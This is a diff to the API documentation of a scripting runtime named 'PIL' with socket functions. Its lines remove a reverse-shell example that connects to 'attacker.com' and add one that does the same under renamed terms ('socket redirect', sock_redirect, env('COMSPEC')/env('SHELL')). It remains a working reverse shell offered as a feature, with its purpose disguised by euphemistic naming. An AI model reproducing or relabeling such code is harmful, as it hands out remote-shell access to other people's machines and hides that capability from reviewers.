@@ -529,6 +529,7 @@ PIL::OpenStdLib(L);
 | `push(arr, v)` | Add element to array | `push(arr, 4)` | - |
 | `pop(arr)` | Remove last element | `pop(arr)` | Last element |
 | `os()` | Get OS type | `os()` | `"win"`, `"linux"`, or `"uefi"` |
+| `env(name)` | Get environment variable | `env("COMSPEC")` | `"C:\Windows\System32\cmd.exe"` |
 
 ---
 
@@ -606,7 +607,7 @@ PIL::OpenNetworkIO(L, &netCtx);
 | `sock_close(handle)` | Close socket, returns true/false |
 | `sock_send(handle, data)` | Send data, returns bytes sent or -1 |
 | `sock_recv(handle [, size])` | Receive data (max 255 bytes), returns string |
-| `sock_bind(handle, cmd)` | Bind socket to process stdin/stdout (reverse/bind shell), returns PID or -1 |
+| `sock_redirect(handle, process_path)` | Redirect socket to new process stdin/stdout, returns PID or -1 |
 
 Maximum 8 sockets simultaneously.
 
@@ -622,27 +623,25 @@ if (sock >= 0) {
 }
 ```
 
-#### Reverse Shell Example
+#### Socket Redirect Example
 
 ```javascript
-// Cross-platform reverse shell using os() for shell detection
-var sock = sock_connect("attacker.com", 4444);
+// Cross-platform socket redirect using env() for path resolution
+var sock = sock_connect("example.com", 4444);
 if (sock >= 0) {
-    var shell = "";
+    var process_path = "";
     var platform = os();
 
     if (platform == "win") {
-        shell = "cmd.exe";       // Windows Command Prompt
-        // shell = "powershell.exe";  // Alternative: PowerShell
+        process_path = env("COMSPEC");  // e.g., "C:\Windows\System32\cmd.exe"
     } else if (platform == "linux") {
-        shell = "/bin/sh";       // POSIX shell
-        // shell = "/bin/bash";  // Alternative: Bash
+        process_path = env("SHELL");    // e.g., "/bin/bash"
     }
 
-    if (len(shell) > 0) {
-        var pid = sock_bind(sock, shell);
+    if (len(process_path) > 0) {
+        var pid = sock_redirect(sock, process_path);
         if (pid >= 0) {
-            print("Shell spawned with PID:", pid);
+            print("Process spawned with PID:", pid);
         }
     } else {
         print("Unsupported platform:", platform);
@@ -1052,7 +1051,7 @@ The following functions are planned for future implementation:
 
 | Function | Description |
 |----------|-------------|
-| `ws_bind(ws, cmd)` | Bind WebSocket to process stdin/stdout |
+| `ws_redirect(ws, process_path)` | Redirect WebSocket to process stdin/stdout |
 | `exec(cmd)` | Execute command, return output |
 | `spawn(cmd)` | Spawn async process, return handle |
 | `pipe_read(handle)` / `pipe_write(handle, data)` | I/O with spawned process |
@@ -1079,7 +1078,6 @@ The following functions are planned for future implementation:
 
 | Function | Description |
 |----------|-------------|
-| `env(name)` | Get environment variable |
 | `hostname()` | Get system hostname |
 | `whoami()` | Current username |
 | `pid()` | Current process ID |
